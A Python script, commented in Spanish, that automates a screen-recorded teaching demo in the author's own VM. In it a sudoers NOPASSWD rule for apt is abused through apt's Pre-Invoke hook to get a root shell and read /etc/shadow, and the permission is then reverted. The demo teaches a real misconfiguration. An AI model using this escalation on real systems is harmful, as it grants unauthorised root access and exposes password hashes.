#!/usr/bin/env python3
"""
demo_sudo_nopasswd.py — Demo COMPLETA dentro de la VM: sudo mal configurado. Un admin da a un usuario de
bajo privilegio permiso NOPASSWD sobre `apt` para que pueda actualizar el sistema él mismo — un caso MUY
real y aparentemente razonable — y ese mismo permiso basta para llegar a root entero (técnica GTFOBins:
el "Pre-Invoke hook" de apt ejecuta cualquier comando, como root, antes de actualizar).

    python demo_sudo_nopasswd.py [nombre_toma]        (def. sudo-nopasswd-AAAAMMDD-HHMM)

Marco ético: no hay objetivo remoto ni laboratorio de terceros — todo ocurre con un usuario de laboratorio
(`invitado`) y una regla de `/etc/sudoers.d/` que el propio guion crea y borra, dentro de la VM propia del
usuario. La contraseña de `invitado` la elige el guion para esta demo (no se adivina ninguna real). Ver
00-recon.md.

Hace: limpiamos (NO grabado) → dos terminales lado a lado (Admin / Invitado) → grabación → Acto 1
(invitado, sin privilegios: sudo -l lo niega) → Acto 2 (el admin edita /etc/sudoers.d/invitado con nano,
vía `visudo -f`, y añade NOPASSWD sobre apt pensando en el caso de uso legítimo) → Acto 3 (invitado: sudo
-l ya lo permite, sin contraseña, y lo usa de verdad para actualizar el sistema) → Acto 4 (explotación:
el Pre-Invoke hook de apt ejecuta una shell como root) → Acto 5 (shell de root y prueba final leyendo
/etc/shadow) → Acto 6 (cierre: se revierte el permiso y se comprueba que vuelve a estar negado) → trae el
.mp4, el .steps.jsonl y el mapa de edición .mapa.md. Cada paso se verifica con texto real en pantalla.
Entrada humana siempre (vm_control.type_in/move/click).
"""
import os
import sys
import time
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "herramientas"))
import vm_control as v  # noqa: E402  (también pone nucleo/ en el path)
from nucleo.rutas import SHORTS  # noqa: E402

USUARIO = "invitado"
PASSWORD = "invitado-demo-2026"            # contraseña de laboratorio, elegida por el guion, no adivinada
BINARIO = "/usr/bin/apt"
REGLA_SUDOERS = f"{USUARIO} ALL=(ALL) NOPASSWD: {BINARIO}"
SUDOERS_FILE = f"/etc/sudoers.d/{USUARIO}"

# Dos terminales lado a lado, medio ancho cada una (960x973 de 1920x1012): la misma geometría que
# DEMO-SSHOLE. Fuente del terminal ya comprobada a 24pt en esta VM (METODOLOGIA/10 §0-3).
RECT_ADMIN = (0, 39, 960, 973)
RECT_INVITADO = (960, 39, 960, 973)

# Pausa mínima tras CADA Return antes de teclear el siguiente comando (lección de DEMO-CHMOD-CHOWN: con
# <1 s el terminal puede no haber acabado de procesar el anterior y el siguiente sale mal tecleado).
PAUSA = 1.2


def focus_rect(rect, why):
    x, y, w, h = rect
    v.focus(x + w // 2, y + h // 2, why, w=w, h=h)


def clear_and_focus(rect, why):
    """Limpia la terminal (Ctrl+L, instantáneo) y fija el foco en `rect`: el siguiente comando sale solo,
    arriba del todo (METODOLOGIA/10 §3.3), y también vuelve al rect completo tras un `waitfor()` (§3.4).
    Cada comando importante (sudo -l, id, visudo -c...) se limpia justo antes: así su salida sale SIEMPRE
    arriba de la terminal, nunca enterrada al final — pedido explícito del usuario, no solo al abrir un
    acto nuevo."""
    v.ssh("xdotool key ctrl+l")
    time.sleep(0.3)
    focus_rect(rect, why)


def clear_and_focus_sh(term, rect, why, seed=0):
    """Como clear_and_focus, pero para cuando la shell activa es `/bin/sh` (dash, sin readline): Ctrl+L no
    limpia ahí (no tiene el binding "clear-screen" de bash), así que se teclea el comando `clear` de
    verdad. Se usa SOLO dentro de la shell de root obtenida por el exploit (Actos 4-5); en cualquier bash
    (todo lo demás) Ctrl+L ya basta."""
    v.type_in(term, "clear", wpm=50, typos=0, seed=seed)
    v.ssh("xdotool key Return")
    time.sleep(0.3)
    focus_rect(rect, why)


def comando(term, texto, wpm=44, typos=0.012, seed=0):
    """Teclea UN comando suelto, Enter, y la pausa mínima antes de que se pueda teclear otro (ver PAUSA)."""
    v.type_in(term, texto, wpm=wpm, typos=typos, seed=seed)
    v.ssh("xdotool key Return")
    time.sleep(PAUSA)


def verificar(ok, msg):
    if not ok:
        v.die("VERIFICACIÓN FALLIDA: " + msg)


def preparar_entorno():
    """Deja el usuario de laboratorio limpio y SIN la regla de sudoers ANTES de grabar (Fase 0): así la
    toma es repetible y empieza siempre desde "sin privilegios". `pkill` antes de `userdel` evita el fallo
    "user invitado is currently used by process ..." si una sesión anterior (p. ej. `sudo -iu invitado`)
    quedó colgada en el invitado (medido esta sesión: userdel -r fallaba en silencio por un bash huérfano)."""
    v.ssh(f"sudo pkill -9 -f 'nano|visudo' 2>/dev/null; sudo pkill -9 -u {USUARIO} 2>/dev/null; true", check=False)
    v.ssh(f"sudo userdel -r {USUARIO} 2>/dev/null; sudo rm -f {SUDOERS_FILE}; true", check=False)
    # nano deja un lock (.NOMBRE.swp) si se mata con -9 a medio editar (p. ej. una toma anterior abortada):
    # si queda, el siguiente `visudo -f` abre un diálogo de aviso ("being edited by root...") en vez del
    # editor normal, y el guion se queda tecleando a ciegas sobre ese diálogo. Medido esta sesión.
    v.ssh("sudo find /etc/sudoers.d -maxdepth 1 -name '.*.swp' -delete", check=False)
    v.ssh(f"sudo useradd -m -s /bin/bash {USUARIO}", capture=True, timeout=15)
    v.ssh(f"echo '{USUARIO}:{PASSWORD}' | sudo chpasswd", capture=True, timeout=15)


def main():
    nombre = sys.argv[1] if len(sys.argv) > 1 else datetime.now().strftime("sudo-nopasswd-%Y%m%d-%H%M")

    print("preparando el entorno (sin grabar)...")
    preparar_entorno()

    admin = v.launch_terminal("Admin")
    invitado = v.launch_terminal("Invitado")
    v.place_id(admin, *RECT_ADMIN)
    v.place_id(invitado, *RECT_INVITADO)
    v.activate_id(invitado)

    v.take_start(nombre)
    v.rec_start()
    focus_rect(RECT_INVITADO, "inicio: terminal Invitado")   # ANTES del primer mark (METODOLOGIA/10 §3.5)
    s = 0

    def sig():
        nonlocal s
        s += 1
        return s

    try:
        v.mark("Acto 1: invitado, un usuario normal sin privilegios")
        clear_and_focus(RECT_INVITADO, "Acto 1, pantalla limpia")
        comando(invitado, f"sudo -iu {USUARIO}", seed=sig())        # kali abre la sesión con su propio sudo
        clear_and_focus(RECT_INVITADO, "whoami arriba del todo")
        comando(invitado, "whoami", seed=sig())
        verificar(v.waitfor(USUARIO, 8), "la sesión no cambió al usuario invitado")
        clear_and_focus(RECT_INVITADO, "id arriba del todo")
        comando(invitado, "id", seed=sig())
        verificar(v.waitfor("uid=1001", 8), "id no mostró el uid esperado de invitado")
        time.sleep(1.5)
        clear_and_focus(RECT_INVITADO, "sudo -l arriba del todo: es el mensaje clave de este acto")
        comando(invitado, "sudo -l", seed=sig())
        verificar(v.waitfor("password", 8), "sudo -l no pidió la contraseña de invitado")
        v.type_in(invitado, PASSWORD, wpm=40, typos=0, seed=sig())
        v.ssh("xdotool key Return")
        verificar(v.waitfor("may not run sudo", 10), "invitado no debería tener ningún permiso todavía")
        time.sleep(3)                                               # pausa de lectura: el punto de partida

        v.mark("Acto 2: el admin edita /etc/sudoers.d con nano para dar un permiso puntual")
        v.activate_id(admin)
        clear_and_focus(RECT_ADMIN, "Acto 2, pantalla limpia")
        # `visudo -f` (no editar el fichero a mano): valida la sintaxis SOLO si guardamos algo correcto.
        # Kali ya mantiene EDITOR para visudo (Defaults!/usr/sbin/visudo env_keep+="EDITOR"), así que basta
        # exportarla en esta shell para que nano sea el editor que abre `visudo -f`.
        comando(admin, "export EDITOR=nano", seed=sig())
        comando(admin, f"sudo visudo -f {SUDOERS_FILE}", seed=sig())
        time.sleep(1.5)                                             # dar tiempo a que nano termine de abrir
        # Ni "nano" (no se imprime en pantalla, la cabecera solo muestra el nombre del fichero) ni "write
        # out" (medido esta sesión: Tesseract lee mal "Write" en el pie de nano con este tema/fuente,
        # aunque el vídeo real se vea perfecto — mismo tipo de fallo que "parsed ok" más abajo). "replace"
        # (del pie "^\ Replace") sale limpio en el volcado real de OCR de esta sesión.
        verificar(v.waitfor("replace", 8), "nano no se abrió sobre el fichero de sudoers")
        time.sleep(1)                                                # pausa: el espectador ve el editor vacío
        v.type_in(admin, REGLA_SUDOERS, wpm=38, typos=0.01, seed=sig())
        time.sleep(1.5)                                              # pausa de lectura: la línea añadida
        v.ssh("xdotool key ctrl+o")                                 # Write Out
        time.sleep(0.8)
        # "cancel" (del pie "^C Cancel" que aparece al guardar), no "file name": mismo motivo que arriba.
        verificar(v.waitfor("cancel", 5), "nano no mostró el prompt para confirmar el nombre al guardar")
        v.ssh("xdotool key Return")                                 # confirma el mismo nombre de fichero
        time.sleep(0.8)
        v.ssh("xdotool key ctrl+x")                                 # Exit
        time.sleep(1)
        clear_and_focus(RECT_ADMIN, "visudo -c arriba del todo: confirma la regla guardada")
        comando(admin, "sudo visudo -c", seed=sig())
        # "parsed ok" a secas, no la ruta completa: el OCR es poco fiable con una racha de "/" y "."
        # seguidos (medido esta sesión: el texto se ve perfecto en el vídeo real, pero Tesseract no
        # encontraba la cadena exacta "sudoers.d/invitado: parsed ok" — el mismo tipo de fallo que
        # METODOLOGIA/09 ya documenta para `stat -c`).
        verificar(v.waitfor("parsed ok", 8), "visudo no validó la regla guardada desde nano")
        time.sleep(3)                                               # pausa: la regla ya existe

        v.mark("Acto 3: invitado ya puede actualizar el sistema, sin contraseña")
        v.activate_id(invitado)
        clear_and_focus(RECT_INVITADO, "Acto 3, pantalla limpia")
        comando(invitado, "sudo -l", seed=sig())
        verificar(v.waitfor("NOPASSWD", 8), "sudo -l no muestra el NOPASSWD recién concedido")
        verificar(v.waitfor("apt", 5), "sudo -l no muestra apt como comando permitido")
        time.sleep(3)                                               # momento clave: "solo para actualizar"
        clear_and_focus(RECT_INVITADO, "sudo apt update arriba del todo: la prueba de uso legítimo")
        comando(invitado, "sudo apt update", seed=sig())
        verificar(v.waitfor("packages can be upgraded", 20), "el uso legítimo (sudo apt update) no terminó bien")
        time.sleep(3)                                               # se ve: el permiso funciona como el admin quería

        v.mark("Acto 4: GTFOBins — el Pre-Invoke hook de apt ejecuta lo que sea, como root")
        clear_and_focus(RECT_INVITADO, "Acto 4, pantalla limpia")
        comando(invitado, "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh", seed=sig())
        time.sleep(1)
        # a partir de aquí la shell activa es /bin/sh (dash, sin readline): Ctrl+L no limpia, se usa el
        # comando `clear` de verdad (clear_and_focus_sh) para que cada prueba salga arriba del todo.
        clear_and_focus_sh(invitado, RECT_INVITADO, "whoami arriba del todo, ya como root", seed=sig())
        comando(invitado, "whoami", seed=sig())
        verificar(v.waitfor("root", 8), "la shell obtenida no responde como root")
        time.sleep(4)                                               # momento clave: ya es root

        v.mark("Acto 5: shell de root y prueba final")
        clear_and_focus_sh(invitado, RECT_INVITADO, "id arriba del todo", seed=sig())
        comando(invitado, "id", seed=sig())
        verificar(v.waitfor("uid=0(root)", 8), "la shell obtenida no tiene uid=0")
        time.sleep(1.5)
        clear_and_focus_sh(invitado, RECT_INVITADO, "head -1 /etc/shadow arriba del todo: la prueba final", seed=sig())
        comando(invitado, "head -1 /etc/shadow", seed=sig())
        # "root" a secas: la línea real es "root:*:20425:0:99999:7:::", una racha de ":" que el OCR lee
        # mal (mismo motivo que el fix de "parsed ok" más arriba) aunque en el vídeo se vea perfecta.
        verificar(v.waitfor("root", 10), "no se pudo leer /etc/shadow como prueba final de acceso root")
        time.sleep(4)                                               # momento clave: la prueba que no admite duda
        comando(invitado, "exit", seed=sig())                       # vuelve a la shell de invitado
        time.sleep(1)
        v.ssh("xdotool key ctrl+c")                                  # corta el apt update que quedó a medias

        v.mark("Acto 6: cierre — se revierte el permiso")
        v.activate_id(admin)
        clear_and_focus(RECT_ADMIN, "Acto 6, pantalla limpia")
        comando(admin, f"sudo rm {SUDOERS_FILE}", seed=sig())
        time.sleep(1)
        v.activate_id(invitado)
        clear_and_focus(RECT_INVITADO, "sudo -l final arriba del todo: confirma el cierre")
        comando(invitado, "sudo -l", seed=sig())
        # sin la regla, invitado vuelve a no tener NINGÚN permiso (igual que en el Acto 1): sudo vuelve a
        # pedirle su contraseña antes de poder decir que no está autorizado (NOPASSWD nunca creó una
        # credencial en caché; medido esta sesión, el guion olvidaba repetir este paso y se quedaba
        # colgado esperando la contraseña).
        verificar(v.waitfor("password", 8), "sudo -l no pidió la contraseña de invitado al revertir")
        v.type_in(invitado, PASSWORD, wpm=40, typos=0, seed=sig())
        v.ssh("xdotool key Return")
        verificar(v.waitfor("may not run sudo", 10), "el permiso debería haber quedado revertido")
        time.sleep(3)
        v.mark("Cierre")
    finally:
        v.take_end()

    print("limpiando la máquina (fuera de grabación)...")
    v.ssh(f"sudo userdel -r {USUARIO} 2>/dev/null; sudo rm -f {SUDOERS_FILE}; true", check=False)

    script = os.path.join(SHORTS, "short_desde_toma.py")  # ruta del repo: nucleo/rutas.py
    import subprocess
    subprocess.run([sys.executable, script, nombre,
                    "--titulo", "Sudo-Mal-Configurado-Como-Un-Solo-Permiso-Te-Da-Root-Entero"],
                   check=True)


if __name__ == "__main__":
    main()
